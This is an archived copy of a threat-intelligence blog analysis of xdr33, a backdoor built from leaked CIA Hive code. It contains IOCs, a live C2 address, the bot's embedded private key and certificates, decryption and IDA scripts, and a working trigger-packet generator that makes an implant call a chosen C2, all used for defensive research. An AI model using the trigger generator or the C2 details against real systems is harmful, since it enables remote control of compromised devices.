{
    "id": "df908188-176e-4b8c-9d9c-b61df495824f",
    "created_at": "2023-02-02T02:07:46.791051Z",
    "updated_at": "2025-03-27T02:05:36.49398Z",
    "deleted_at": null,
    "sha1_hash": "692209ba103a2b6415217a1c6387e553f5e0bb32",
    "title": "2023-01-10 - Heads up! Xdr33, A Variant Of CIA’s HIVE Attack Kit Emerges",
    "authors": "",
    "file_creation_date": "2023-02-01T07:53:03Z",
    "file_modification_date": "2023-02-01T07:53:03Z",
    "file_size": 2134321,
    "plain_text": "# Heads up! Xdr33, A Variant Of CIA’s HIVE Attack Kit Emerges\n\n**[blog.netlab.360.com/headsup_xdr33_variant_of_ciahive_emeerges/](https://blog.netlab.360.com/headsup_xdr33_variant_of_ciahive_emeerges/)**\n\nAlex.Turing January 10, 2023\n\n## Overview\n\nOn Oct 21, 2022, 360Netlab's honeypot system captured a suspicious ELF file\n```\nee07a74d12c0bb3594965b51d0e45b6f, which propagated via F5 vulnerability with zero VT\n\n```\ndetection, our system observces that it communicates with IP 45.9.150.144 using SSL with\n**forged Kaspersky certificates, this caught our attention. After further lookup, we confirmed**\nthat this sample was adapted from the leaked Hive project server source code from CIA.\n**This is the first time we caught a variant of the CIA HIVE attack kit in the wild, and we**\nnamed it xdr33 based on its embedded Bot-side certificate CN=xdr33.\n\nTo summarize, xdr33 is a backdoor born from the CIA Hive project, its main purpose is to\ncollect sensitive information and provide a foothold for subsequent intrusions. In terms of\nnetwork communication, xdr33 uses XTEA or AES algorithm to encrypt the original traffic,\nand uses SSL with Client-Certificate Authentication mode enabled to further protect the\ntraffic; in terms of function there are two main tasks: beacon and trigger of which beacon is\n\n\n-----\n\nperiodically report sensitive information about the device to the hard-coded Beacon C2 and\nexecute the commands issued by it, while the trigger is to monitor the NIC traffic to identify\nspecific messages that conceal the Trigger C2, and when such messages are received, it\nestablishes communication with the Trigger C2 and waits for the execution of the commands\nissued by it.\n\nThe functional schematic is shown below.\n\nHive uses the BEACON_HEADER_VERSION macro to define the specified version, which has a\nvalue of 29 on the Master branch of the source code and a value of 34 in xdr33, so perhaps\nxdr33 has had several rounds of iterative updates already. Comparing with the HIV source\ncode, xdr33 has been updated in the following 5 areas:\n\nNew CC instructions have been added\nWrapping or expanding functions\nStructs have been reordered and extended\nTrigger message format\nAddition of CC operations to the Beacon task\n\nThese modifications to xdr33 are not very sophisticated in terms of implementation, and\ncoupled with the fact that the vulnerability used in this spread is N-day, we tend to rule out\nthe possibility that the CIA continued to improve on the leaked source code and consider it to\nbe the result of a cyber attack group borrowing the leaked source code.\n\n## Vulnerability Delivery Payload\n\nThe md5 of the Payload we captured is ad40060753bc3a1d6f380a5054c1403a, and its\ncontents are shown below.\n\n\n-----\n\nThe code is simple and straightforward, and its main purpose is to\n\nDownload the next stage of the sample and disguise it as /command/bin/hlogd.\n\nInstall logd service for persistence.\n\n## Sample analysis\n\nWe captured only one sample of xdr33 for the X86 architecture, and its basic information is\nshown below.\n```\nMD5:ee07a74d12c0bb3594965b51d0e45b6f\n\nELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\n\nPacker: None\n\n\n```\nSimply put, when xdr33 runs in the compromised device, it first decrypts all the configuration\ninformation, then checks if it has root/admin permissions, if not, it prints “Insufficient\npermissions. try again... “and exit; otherwise initialize various runtime parameters, such as\nC2, PORT, runtime interval, etc. Finally, the two functions beacon_start and TriggerListen are\nused to open the two tasks of Beacon and Trigger.\n\n\n-----\n\nThe following article mainly analyzes the implementation of Beacon and Trigger from the\nperspective of binary inversion; at the same time, we also compare and analyze the source\ncode to see what changes have occurred.\n\n## Decrypting configuration information\n\nxdr33 decodes the configuration information by the following code snippet decode_str, its\nlogic is very simple, i.e., byte-by-byte inverse.\n\nIn IDA you can see that decode_str has a lot of cross-references, 152 in total. To assist in the\nanalysis, we implemented the IDAPython script Decode_RES in the appendix to decrypt the\nconfiguration information.\n\n\n-----\n\nThe decryption results are shown below, including Beacon C2 45.9.150.144, runtime prompt\nmessages, commands to view device information, etc.\n\n\n-----\n\n## Beacon Task\n\nThe main function of Beacon is to periodically collect PID, MAC, SystemUpTime, process\nand network related device information; then use bzip, XTEA algorithm to compress and\nencrypt the device information, and report to C2; finally wait for the execution of the\ncommands issued by C2.\n\n## 0x01: Information Collection\n\nMAC\n\nQuery MAC by SIOCGIFCON or SIOCGIFHWADDR\n\n\n-----\n\nSystemUpTime\n\nCollects system up time via /proc/uptime\n\nProcess and network-related information\n\nCollect process, NIC, network connection, and routing information by executing the\nfollowing 4 commands\n\n## 0x02: Information processing\n\nXdr33 combines different device information through the update_msg function\n\n\n-----\n\nIn order to distinguish different device information, Hive designed ADD_HDR, which is\ndefined as follows, and \"3, 4, 5, 6\" in the above figure represents different Header Type.\n```\ntypedef struct __attribute__ ((packed)) add_header {\n\n     unsigned short type;\n\n     unsigned short length;\n\n} ADD_HDR;\n\n\n\n```\nWhat does \"3, 4, 5, 6\" represent exactly? This depends on the definition of Header Types in\nthe source code below. xdr33 is extended on this basis, with two new values 0 and 9,\nrepresenting Sha1[:32] of MAC, and PID of xdr33 respectively\n\n\n-----\n\nSome of the information collected by xdr32 in the virtual machine is shown below, and it can\nbe seen that it contains the device information with head type 0,1,2,7,9,3.\n\nIt is worth mentioning that type=0, Sha1[:32] of MAC, which means that it takes the first 32\nbytes of MAC SHA1. Take the mac in the above figure as an example, its calculation process\nis as follows.\n```\nmac:00-0c-29-94-d9-43,remove \"-\"\n\nresult:00 0c 29 94 d9 43\n\nsha1 of mac:\n\nresult:c55c77695b6fd5c24b0cf7ccce3e464034b20805\n\nsha1[:32] of mac:\n\nresult:c55c77695b6fd5c24b0cf7ccce3e4640\n\n\n```\nWhen all the device information is combined, use bzip to compress it and add 2 bytes of\n```\nbeacon_header_version and 2 bytes of OS information in the header.\n\n## 0x03: Network Communication\n\n```\nThe communication process between xdr33 and Beacon C2 contains the following 4 steps,\nand the details of each step will be analyzed in detail below.\n\nTwo-way SSL authentication\nObtain XTEA key\nReport XTEA encrypted device information to C2\nExecute the commands sent by C2\n\n### Step1: Two-way SSL Authentication\n\n\n-----\n\nTwo-way SSL authentication requires Bot and C2 to confirm each other s identity, from the\nnetwork traffic level, it is obvious that Bot and C2 request each other's certificate and verify\nthe process.\n\nThe author of xdr33 uses the kaspersky.conf and thawte.conf templates in the source\nrepository to generate the required Bot certificate, C2 certificate and CA certificate.\n\n\n-----\n\nThe CA certificate, Bot certificate and PrivKey are hardcoded in xdr32 in DER format.\n\nThe Bot certificate can be viewed using openssl x509 -in Cert -inform DER -noout ```\ntext, where CN=xdr33, which is where the family name comes from.\n\n```\nYou can use openssl s_client -connect 45.9.150.144:443 to see the C2 certificate. bot,\nC2 certificates are disguised as being related to kaspersky, reducing the suspiciousness of\nnetwork traffic in this way.\n\n\n-----\n\nThe CA certificates are shown below. From the validity of the 3 certificates, we presume that\nthe start of this activity is after 2022.10.7.\n\n### Step2: Obtain XTEA key\n\n\n-----\n\nAfter establishing SSL communication between Bot and C2, Bot requests XTEA key from C2\nvia the following code snippet.\n\nThe processing logic is.\n\n1. Bot sends 64 bytes of data to C2 in the format of \"length of device information length\n\nstring (xor 5) + device information length string (xor 5) + random data\".\n\n2. Bot receives 32 bytes of data from C2 and gets 16 bytes of XTEA KEY from it, the\n\nequivalent python code to get the KEY is as follows.\n```\n   XOR_KEY=5\n\n   def get_key(rand_bytes):\n\n        offset = (ord(rand_bytes[0]) ^ XOR_KEY) % 15\n\n        return rand_bytes[(offset+1):(offset+17)]\n\n\n### Step3: Report XTEA encrypted device information to C2\n\n```\nBot uses the XTEA KEY obtained from Step2 to encrypt the device information and report it\nto C2. since the device information is large, it usually needs to be sent in chunks, Bot sends\nup to 4052 bytes at a time, and C2 replies with the number of bytes it has accepted.\n\n\n-----\n\nIt is also worth mentioning that XTEA encryption is only used in Step3, and the subsequent\nStep4 only uses the SSL-negotiated encryption suite for network traffic, and no longer uses\nXTEA.\n\n### Step4: Waiting for execution command (new function added by xdr33)\n\nAfter the device information is reported, C2 sends 8 bytes of task number N of this cycle to\nBot, if N is equal to 0, it will sleep for a certain time and enter the next cycle of Beacon Task;\nif not, it will send 264 bytes of task. bot receives the task, parses it, and executes the\ncorresponding instruction.\n\nThe supported instructions are shown in the following table.\n\n**Index** **Function**\n\n\n-----\n\n**Index** **Function**\n\n0x01 Download File\n\n0x02 Execute CMD with fake name \"[kworker/3:1-events]\"\n\n0x03 Update\n\n0x04 Upload File\n\n0x05 Delete\n\n0x08 Launch Shell\n\n0x09 Socket5 Proxy\n\n0x0b Update BEACONINFO\n\n## Network Traffic Example\n\n### The actual step2 traffic generated by xdr33\n\n The interaction in step3, and the traffic from step4\n\n\n-----\n\n### What information can we get from this?？\n\n1. The length of the device information length string, 0x1 ^ 0x5 = 0x4\n\n2. The length of the device information, 0x31,0x32,0x37,0x35 respectively xor 5 gives\n\n4720\n\n3. tea key 2E 09 9B 08 CF 53 BE E7 A0 BE 11 42 31 F4 45 3A\n\n4. C2 will confirm the length of the device information reported by the BOT, 4052+668 =\n\n4720, which corresponds to the second point\n\n5. The number of tasks in this cycle is 00 00 00 00 00 00 00, i.e. there is no task, so no\n\nspecific task of 264 bytes will be issued.\n\nThe encrypted device information can be decrypted by the following code, and the decrypted\ndata is 00 22 00 14 42 5A 68 39, which contains the beacon_header_version + os +\n```\nbzip magic, and the previous analysis can correspond to one by one.\n\n```\n\n-----\n\n```\nimport hexdump\n\nimport struct\n\ndef xtea_decrypt(key,block,n=32,endian=\"!\"):\n\n  v0,v1 = struct.unpack(endian+\"2L\", block)\n\n  k = struct.unpack(endian+\"4L\",key)\n\n  delta,mask = 0x9e3779b9,0xffffffff\n\n  sum = (delta * n) & mask\n\n  for round in range(n):\n\n    v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask\n\n    sum = (sum - delta) & mask\n\n    v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask\n\n  return struct.pack(endian+\"2L\",v0,v1)\n\ndef decrypt_data(key,data):\n\n  size = len(data)\n\n  i = 0\n\n  ptext = b''\n\n  while i < size:\n\n    if size - i >= 8:\n\n      ptext += xtea_decrypt(key,data[i:i+8])\n\n    i += 8\n\n  return ptext\n\nkey=bytes.fromhex(\"\"\"\n\n2E 09 9B 08 CF 53 BE E7 A0 BE 11 42 31 F4 45 3A\n\n\"\"\")\n\nenc_buf=bytes.fromhex(\"\"\"\n\n65 d8 b1 f9 b8 37 37 eb\n\n\"\"\")\n\nhexdump.hexdump(decrypt_data(key,enc_buf))\n\n## Trigger Task\n\n```\nThe main function of the Trigger is to listen to all traffic and wait for the Triggger IP message\nin a specific format. Once the message and the Trigger Payload hidden in the message pass\nthe layers of verification, the Bot establishes communication with the C2 in the Trigger\nPayload and waits for the execution of the instructions sent.\n\n## 0x1: Listening for traffic\n\nUse the function call socket( PF_PACKET, SOCK_RAW, htons( ETH_P_IP ) ) to set RAW\nSOCKET to capture IP messages, and then the following code snippet to process IP\nmessages, you can see that Tirgger supports TCP,UDP and the maximum length of\nmessage Payload is 472 bytes. This kind of traffic sniffing implementation will increase the\nCPU load, in fact using BPF-Filter on sockets will work better.\n\n\n-----\n\n## 0x2: Checksum Trigger packets\n\nTCP and UDP messages that meet the length requirement are further verified using the\nsame check_payload function.\n\n\n-----\n\n**check_payload的代码如下所示:**\n\nThe processing logic can be seen as follows.\n\nUse CRC16/CCITT-FALSE algorithm to calculate the CRC16 value of offset 8 to 92 in\nthe message to get crcValue\nThe offset value of crcValue in the message is obtained by crcValue % 200+ 92,\ncrcOffset\nVerify whether the data at crcOffset in the message is equal to crcValue, if it is equal,\ngo to the next step\nCheck if the data at crcOffset+2 in the message is an integer multiple of 127, if yes, go\nto the next step\nTrigger_Payload is encrypted, the starting position is crcOffset+12, the length is 29\nbytes. the starting position of Xor_Key is crcValue%55+8, XOR the two byte by byte,\nwe get Trigger_Paylaod\n\nSo far it can be determined that the Trigger message format is as follows\n\n## 0x3: Checksum Trigger Payload\n\nIf the Trigger message passes the checksum, the check_trigger function continues to check\nthe Trigger Payload\n\n\n-----\n\nThe processing logic can be seen as follows\n\nTake the last 2 bytes of the Trigger Payload and write it as crcRaw\nSet the last 2 bytes of the Trigger Payload to 0 and calculate its CRC16, which is called\ncrcCalc\nCompare crcRaw and crcCalc, if they are equal, it means that the Trigger Payload is\nstructurally valid.\n\nNext, the SHA1 of the key in the Trigger Payload is calculated and compared with the hardcoded SHA1 46a3c308401e03d3195c753caa14ef34a3806593 in the Bot. If it is equal, it\nmeans that the Trigger Payload is also valid in content, so we can go to the last step,\nestablish communication with C2 in the Trigger Payload, and wait for the execution of its\nissued command.\n\nThe format of the Trigger Payload can be determined as follows.\n\n## 0x4: Execution of Trigger C2's command\n\n\n-----\n\nAfter a Trigger message passes the checksum, the Bot actively communicates with the C2\nspecified in the Trigger Payload and waits for the execution of the instructions issued by the\nC2.\n\nThe supported instructions are shown in the following table.\n\n**Index** **Function**\n\n0x00,0x00a Exit\n\n0x01 Download File\n\n0x02 Execute CMD\n\n0x04 Upload File\n\n0x05 Delete\n\n0x06 Shutdown\n\n0x08 Launch SHELL\n\n\n-----\n\n**Index** **Function**\n\n0x09 SOCKET5 PROXY\n\n0x0b Update BEACONINFO\n\nIt is worth noting that Trigger C2 differs from Beacon C2 in the details of communication;\nafter establishing an SSL tunnel, Bot and Trigger C2 use a Diffie-Helllman key exchange to\nestablish a shared key, which is used in the AES algorithm to create a second layer of\nencryption.\n\n## Experiment\n\nTo verify the correctness of the reverse analysis of the Trigger part, we Patch the SHA1\nvalue of xdr33, fill in the SHA1 of NetlabPatched,Enjoy! and implement the GenTrigger\ncode in the appendix to generate UDP type Trigger messages.\n\nWe run the Patch in the virtual machine 192.168.159.133 after the xdr33 sample, the\nconstruction of C2 for 192.168.159.128:6666 Trigger Payload, and sent to 192.168.159.133\nin the form of UDP. the final result is as follows, you can see the xdr33 in the implanted host\n\n\n-----\n\nafter receiving the UDP Trigger message, and we expected the same, launched a\ncommunication request to the preset Trigger C2, Cool!\n\n## Contact us\n\n[Readers are always welcomed to reach us on twitter or email us to netlab[at]360.cn.](https://twitter.com/360Netlab)\n\n## IOC\n\n sample\n```\nee07a74d12c0bb3594965b51d0e45b6f\n\npatched sample\n\naf5d2dfcafbb23666129600f982ecb87\n\n C2\n45.9.150.144:443\n\n BOT Private Key\n\n```\n\n-----\n\n```\n   BEGIN RSA PRIVATE KEY\nMIIEowIBAAKCAQEA6XthqPjU3XFu8/4PMVQ4iqJbleXmXhbVWMPhY/sTndEcO5vQ\n\nmIMNJc1mISZTNPzddXSrj0h9GJe0ix0CIZID3bHyZHLiqb/ewylFmqSOVkviG/Je\n\no17UAqhsNGpVu/l8FM3qCHJE7z+wBqHdwVIZMt9vLaLti2KyJV+j1F1GTk8X2jcI\n\n4DnnVKJE81rSafzaX2JBc6J6hovFMMP9IGb2LwRQMZNtZqSus6JMolhkO0dtvxXK\n\nyTm1k79HL3PlZdgKt6HJFoukwkWND8NNTbcBXDWWDdJ42g/1I0Z7tMkdKFgfjUut\n\n90LXKRRuENcUrbi75L6P2FRwPnqvVv+3N25MZQIDAQABAoIBADtguG57kc8bWQdO\n\nNljqPVLshXQyuop1Lh7b+gcuREffdVmnf745ne9eNDn8AC86m6uSV0siOUY21qCG\n\naRNWigsohSeMnB5lgGaLqXrxnI1P0RogYncT18ExSgtue41Jnoe/8mPhg6yAuuiE\n\n49uVYHkyn5iwlc7b88hTcVvBuO6S7HPqqXbDEBSoKL0o60/FyPb0RKigprKooTo/\n\nKVCRFDT6xpAGMnjZkSSBJB2cgRxQwkcyghMcLJBvsZXbYNihiXiiiwaLvk4ZeBtf\n\n0hnb6Cty840juAIGKDiUELijd3JtVKaBy41KLrdsnC+8JU3RIVGPtPDbwGanvnCk\n\nIto7gqUCgYEA+MucFy8fcFJtUnOmZ1Uk3AitLua+IrIEp26IHgGaMKFA0hnGEGvb\n\nZmwkrFj57bGSwsWq7ZSBk8yHRP3HSjJLZZQIcnnTCQxHMXa+YvpuEKE5mQSMwnlu\n\nYH9S2S0xQPi1yLQKjAVVt+zRuuJvMv0dOZAOfdib+3xesPv2fIBu0McCgYEA8D4/\n\nzygeF5k4Omh0l235e08lkqLtqVLu23vJ0TVnP2LNh4rRu6viBuRW7O9tsFLng8L8\n\naIohdVdF/E2FnNBhnvoohs8+IeFXlD8ml4LC+QD6AcvcMGYYwLIzewODJ2d0ZbBI\n\nhQthoAw9urezc2CLy0da7H9Jmeg26utwZJB4ZXMCgYEAyV9b/rPoeWxuCd+Ln3Wd\n\n+O6Y5i5jVQfLlo1zZP4dBCFwqt2rn5z9H0CGymzWFhq1VCrT96pM2wkfr6rNBHQC\n\n7LvNvoJ2WotykEmxPcG/Fny4du7k03+f5EEKGLhodlMYJ9P5+W1T/SOUefRO1vFi\n\nFzZPVHLfhcUbi5rU3d7CUv8CgYBG82tu578zYvnbLhw42K7UfwRusRWVazvFsGJj\n\nGe17J9fhTtswHMwtEuSlJvTzHRjorf5TdW/6MqMlp1Ntg5FBHUo4vh3wbZeq3Zet\n\nKV4hoesz+pv140EuL7LKgrgKPCCBI7XXLQxQ8yyL51LlIT9H8rPkopb/EDif2paf\n\n7JbSBwKBgCY8+aO44uuR2dQm0SIUqnb0MigLRs1qcWIfDfHF9K116sGwSK4SD9vD\n\npoCA53ffcrTi+syPiUuBJFZG7VGfWiNJ6GWs48sP5dgyBQaVq5hQofKqQAZAQ0f+\n\n7TxBhBF4n2gc5AhJ3fQAOXZg5rgNqhAln04UAIlgQKO69fAvfzID\n\n-----END RSA PRIVATE KEY----\n\n## BOT Certificate\n\n```\n\n-----\n\n```\n   BEGIN CERTIFICATE\nMIIFJTCCBA2gAwIBAgIBAzANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx\n\nFTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD\n\nVQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv\n\nbiBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy\n\ndmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t\n\nMB4XDTIyMTAwNzE5NTAwN1oXDTIzMDMxNjE5NTAwN1owgYExCzAJBgNVBAYTAlJV\n\nMR0wGwYDVQQKDBRLYXNwZXJza3kgTGFib3JhdG9yeTEUMBIGA1UEAwwLRW5naW5l\n\nZXJpbmcxDjAMBgNVBAMMBXhkcjMzMQ8wDQYDVQQIDAZNb3Njb3cxDzANBgNVBAcM\n\nBk1vc2NvdzELMAkGA1UECwwCSVQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK\n\nAoIBAQDpe2Go+NTdcW7z/g8xVDiKoluV5eZeFtVYw+Fj+xOd0Rw7m9CYgw0lzWYh\n\nJlM0/N11dKuPSH0Yl7SLHQIhkgPdsfJkcuKpv97DKUWapI5WS+Ib8l6jXtQCqGw0\n\nalW7+XwUzeoIckTvP7AGod3BUhky328tou2LYrIlX6PUXUZOTxfaNwjgOedUokTz\n\nWtJp/NpfYkFzonqGi8Uww/0gZvYvBFAxk21mpK6zokyiWGQ7R22/FcrJObWTv0cv\n\nc+Vl2Aq3ockWi6TCRY0Pw01NtwFcNZYN0njaD/UjRnu0yR0oWB+NS633QtcpFG4Q\n\n1xStuLvkvo/YVHA+eq9W/7c3bkxlAgMBAAGjggFXMIIBUzAMBgNVHRMBAf8EAjAA\n\nMB0GA1UdDgQWBBRc0LAOwW4C6azovupkjX8R3V+NpjCB+wYDVR0jBIHzMIHwgBTz\n\nBcGhW/F2gdgt/v0oYQtatP2x5aGB1KSB0TCBzjELMAkGA1UEBhMCWkExFTATBgNV\n\nBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYDVQQKDBRU\n\naGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlvbiBTZXJ2\n\naWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2VydmVyIENB\n\nMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29tggEAMA4G\n\nA1UdDwEB/wQEAwIF4DAWBgNVHSUBAf8EDDAKBggrBgEFBQcDAjANBgkqhkiG9w0B\n\nAQsFAAOCAQEAGUPMGTtzrQetSs+w12qgyHETYp8EKKk+yh4AJSC5A4UCKbJLrsUy\n\nqend0E3plARHozy4ruII0XBh5z3MqMnsXcxkC3YJkjX2b2EuYgyhvvIFm326s48P\n\no6MUSYs5CFxhhp/N0cqmqGgZL5V5evI7P8NpPcFhs7u1ryGDcK1MTtSSPNPy3F+c\n\nd707iRXiRcLQmXQTcjmOVKrohA/kqqtdM5EUl75n9OLTinZcb/CQ9At+5Sn91AI3\n\nngd22cyLLC3O4F14L+hqwMd0ENSjanX38iZ2EY8hMpmNYwPOVSQZ1FpXqrkW1ArI\n\nlHEtKB3YMeSXQHAsvBQD0AlW7R7JqHdreg==\n\n-----END CERTIFICATE----\n\n## CA Certificate\n\n```\n\n-----\n\n```\n   BEGIN CERTIFICATE\nMIIFXTCCBEWgAwIBAgIBADANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx\n\nFTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD\n\nVQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv\n\nbiBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy\n\ndmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t\n\nMB4XDTIyMTAwNzE0MTEzOFoXDTQ3MTAwMTE0MTEzOFowgc4xCzAJBgNVBAYTAlpB\n\nMRUwEwYDVQQIDAxXZXN0ZXJuIENhcGUxEjAQBgNVBAcMCUNhcGUgVG93bjEdMBsG\n\nA1UECgwUVGhhd3RlIENvbnN1bHRpbmcgY2MxKDAmBgNVBAsMH0NlcnRpZmljYXRp\n\nb24gU2VydmljZXMgRGl2aXNpb24xITAfBgNVBAMMGFRoYXd0ZSBQcmVtaXVtIFNl\n\ncnZlciBDQTEoMCYGCSqGSIb3DQEJARYZcHJlbWl1bS1zZXJ2ZXJAdGhhd3RlLmNv\n\nbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMfHJIl4/Xdo896Rlyqr\n\n3VcKnLAAqIJkpgl90Z6bxUDpwa41H3ZDa7As4ZO9xa+lXGn9XB9u34TqJPkyhSKg\n\n3wYK02KTCwVMI/gf506KpFvocTHpScnXs0xUoxsM8qEiDV2pTe447rmyaLyWcT5d\n\nhbzkPl0WuDmEWMhfC2R9z4+mlsbwMAy9PN/JYzxz7cR48qj4j9hhEwkJ1+yJKXBV\n\nAV9CdgLYfJXrA7A4Hxgc0ECKJmpovskv/DlxM8RxOsHfVtyG4ZgqmRraxUelirlf\n\ntLj0fIkLaP7xvo1QSgiqQffbBOiDg9PN3H2wezFOmeDg9RIR6qvhzhyNpZjANiiC\n\nJzMCAwEAAaOCAUIwggE+MA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFPMFwaFb\n\n8XaB2C3+/ShhC1q0/bHlMIH7BgNVHSMEgfMwgfCAFPMFwaFb8XaB2C3+/ShhC1q0\n\n/bHloYHUpIHRMIHOMQswCQYDVQQGEwJaQTEVMBMGA1UECAwMV2VzdGVybiBDYXBl\n\nMRIwEAYDVQQHDAlDYXBlIFRvd24xHTAbBgNVBAoMFFRoYXd0ZSBDb25zdWx0aW5n\n\nIGNjMSgwJgYDVQQLDB9DZXJ0aWZpY2F0aW9uIFNlcnZpY2VzIERpdmlzaW9uMSEw\n\nHwYDVQQDDBhUaGF3dGUgUHJlbWl1bSBTZXJ2ZXIgQ0ExKDAmBgkqhkiG9w0BCQEW\n\nGXByZW1pdW0tc2VydmVyQHRoYXd0ZS5jb22CAQAwDgYDVR0PAQH/BAQDAgGGMA0G\n\nCSqGSIb3DQEBCwUAA4IBAQDBqNA1WFp15AM8l7oDgqa/YHvoGmfcs48Ak8YtrDEF\n\ntLRyz1+hr/hhfR8Hm1hZ0oj1vAzayhCGKdQTk42mq90dG4tViNYMq4mFKmOoVnw6\n\nu4C8BCPfxmuyNFdw9TVqTjdwWqWM84VMg3Cq3ZrEa94DMOAXm3QXcDsar7SQn5Xw\n\nLCsU7xKJc6gwk4eNWEGxFJwS0EwPhBkt1lH4OD11jH0Ukr5rRJvh1blUiOHPd3//\n\nkzeXNozA9PwoH4wewqk8bXZhj5ZA9LR7rm+5OrCoWXofgn1Gi2yd+LWWCrE7NBWm\n\nyRelxOSPRSQ1fvAVvuRrCnCJgKxG/2Ba2DLs95u6IxYX\n\n-----END CERTIFICATE----\n\n## 附录\n\n 0x1 Decode_RES\n\n```\n\n-----\n\n```\nimport idautils\n\nimport ida_bytes\n\ndef decode(addr,len):\n\n  tmp=bytearray()\n\n  buf=ida_bytes.get_bytes(addr,len)\n\n  for i in buf:\n\n    tmp.append(~i&0xff)\n\n  print(\"%x, %s\" %(addr,bytes(tmp)))\n\n  ida_bytes.put_bytes(addr,bytes(tmp))\n\n  idc.create_strlit(addr,addr+len)\n\ncalllist=idautils.CodeRefsTo(0x0804F1D8,1)\n\nfor addr in calllist:\n\n  prev1Head=idc.prev_head(addr)\n\n  if 'push  offset' in idc.generate_disasm_line(prev1Head,1) and\nidc.get_operand_type(prev1Head,0)==5:\n\n    bufaddr=idc.get_operand_value(prev1Head,0)\n\n    prev2Head=idc.prev_head(prev1Head)\n\n    if 'push' in idc.generate_disasm_line(prev2Head,1) and\nidc.get_operand_type(prev2Head,0)==5:\n\n      leng=idc.get_operand_value(prev2Head,0)\n\n      decode(bufaddr,leng)\n\n\n## 0x02 GenTrigger\n\n```\n\n-----\n\n```\nimport random\n\nimport socket\n\n\ndef crc16(data: bytearray, offset, length):\n\n if data is None or offset < 0 or offset > len(data) - 1 and offset + length >\nlen(data):\n\n  return 0\n\n crc = 0xFFFF\n\n for i in range(0, length):\n\n  crc ^= data[offset + i] << 8\n\n  for j in range(0, 8):\n\n   if (crc & 0x8000) > 0:\n\n    crc = (crc << 1) ^ 0x1021\n\n   else:\n\n    crc = crc << 1\n\n return crc & 0xFFFF\n\ndef Gen_payload(ip:str,port:int):\n\n  out=bytearray()\n\n  part1=random.randbytes(92)\n\n  sum=crc16(part1,8,84)\n\n  offset1=sum % 0xc8\n\n  offset2=sum % 0x37\n\n  padding1=random.randbytes(offset1)\n\n  padding2=random.randbytes(8)\n\n  host=socket.inet_aton(ip)\n\n  C2=bytearray(b'\\x01')\n\n  C2+=host\n\n  C2+=int.to_bytes(port,2,byteorder=\"big\")\n\n  key=b'NetlabPatched,Enjoy!'\n\n  C2 = C2+key +b'\\x00\\x00'\n\n  c2sum=crc16(C2,0,29)\n\n  C2=C2[:-2]\n\n  C2+=(int.to_bytes(c2sum,2,byteorder=\"big\"))\n\n  flag=0x7f*10\n\n  out+=part1\n\n  out+=padding1\n\n  out+=(int.to_bytes(sum,2,byteorder=\"big\"))\n\n  out+=(int.to_bytes(flag,2,byteorder=\"big\"))\n\n  out+=padding2\n\n  tmp=bytearray()\n\n  for i in range(29):\n\n   tmp.append(C2[i] ^ out[offset2+8+i])\n\n  out+=tmp\n\n  leng=472-len(out)\n\n```\n\n-----\n\n```\n  lengpadding random.randbytes(random.randint(0,leng+1))\n\n  out+=lengpadding\n\n  return out\n\npayload=Gen_payload('192.168.159.128',6666)\n\nsock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n\nsock.sendto(payload,(\"192.168.159.133\",2345)) # 任意端口\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-10 - Heads up! Xdr33, A Variant Of CIA’s HIVE Attack Kit Emerges.pdf"
    ],
    "report_names": [
        "2023-01-10 - Heads up! Xdr33, A Variant Of CIA’s HIVE Attack Kit Emerges.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1675303666,
    "ts_updated_at": 1743041136,
    "ts_creation_date": 1675237983,
    "ts_modification_date": 1675237983,
    "files": {
        "pdf": "https://archive.orkl.eu/692209ba103a2b6415217a1c6387e553f5e0bb32.pdf",
        "text": "https://archive.orkl.eu/692209ba103a2b6415217a1c6387e553f5e0bb32.txt",
        "img": "https://archive.orkl.eu/692209ba103a2b6415217a1c6387e553f5e0bb32.jpg"
    }
}